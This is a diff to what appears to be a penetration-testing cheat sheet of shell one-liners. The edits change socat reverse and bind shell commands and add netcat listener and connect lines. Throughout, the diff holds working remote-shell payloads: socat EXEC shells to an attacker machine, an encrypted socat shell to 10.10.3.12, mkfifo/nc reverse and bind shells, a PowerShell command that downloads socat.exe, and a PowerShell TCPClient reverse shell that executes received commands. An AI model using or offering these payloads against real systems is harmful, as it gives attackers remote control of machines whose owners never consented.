@@ -55,14 +55,14 @@ Invoke-WebRequest -uri <Local-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
 socat TCP-L:<port>
 
 ## target-machine
-socat TCP:<attacker-machine>:<attacker-port> EXEC:"bash -li"
-socat TCP:<attacker-machine>:<attacker-port> EXEC:powershell.exe,pipes
+socat TCP-CONNECT:<attacker-machine>:<attacker-port> EXEC:"bash -li"
+socat TCP-CONNECT:<attacker-machine>:<attacker-port> EXEC:powershell.exe,pipes
 
 
 ## bind shells
 
 ## attacker-machine
-socat TCP:<target-machine>:<target-port>
+socat TCP-CONNECT:<target-machine>:<target-port>
 
 ## target-machine
 socat TCP-L:<PORT> EXEC:"bash -li"
@@ -73,7 +73,7 @@ socat TCP-L:<PORT> EXEC:powershell.exe, pipes
 
 socat TCP-L:<port> FILE:`tty`,raw,echo=0
 
-socat TCP:<attacker-machine>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+socat TCP-CONNECT:<attacker-machine>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
 
 ============================ STABLIZING socat reverse shells ================================= 
 
@@ -112,9 +112,11 @@ socat OPENSSL:10.10.3.12:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sa
 
 ## bind shell
 `mkfifo /tmp/f;nc -lnvp <PORT> < /tmp/f | /bin/sh > /tmp/f 2>&1; rm -rf /tmp/f`
+`nc <attacker-host> <attacker-port>`
 
 ## reverse shell
 `mkfifo /tmp/f; nc <attacker-host> <attacker-port> < /tmp/f | /bin/sh > /tmp/f 2>&1; rm -rf /tmp/f`
+`nc -lnvp <port>`
 
 ## windows 
 `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
